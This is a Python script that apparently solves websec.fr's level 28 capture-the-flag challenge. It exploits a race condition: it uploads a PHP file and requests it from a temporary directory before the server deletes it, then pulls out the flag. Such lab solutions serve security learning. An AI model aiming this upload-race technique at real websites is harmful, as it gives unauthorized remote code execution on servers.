import httpx
import asyncio
import re

async def firstReq():
    async with httpx.AsyncClient() as client:
        await client.post(url, files=file, data={ "submit" : "a" })

filename = "/tmp/5cb825e333f27354b0d8ae09c292fbbc.php"
url = "https://websec.fr/level28/index.php"
file = { "flag_file" : open('solve.php', 'rb') }

async def main():
    first_req = asyncio.create_task(firstReq())
    await asyncio.sleep(0.5)
    r2 = httpx.get("https://websec.fr/level28/tmp/5cb825e333f27354b0d8ae09c292fbbc.php")
    await first_req
    flag = re.search(r'WEBSEC\{.*\}', r2.text).group()
    print(flag)

if __name__ == '__main__':
    asyncio.run(main())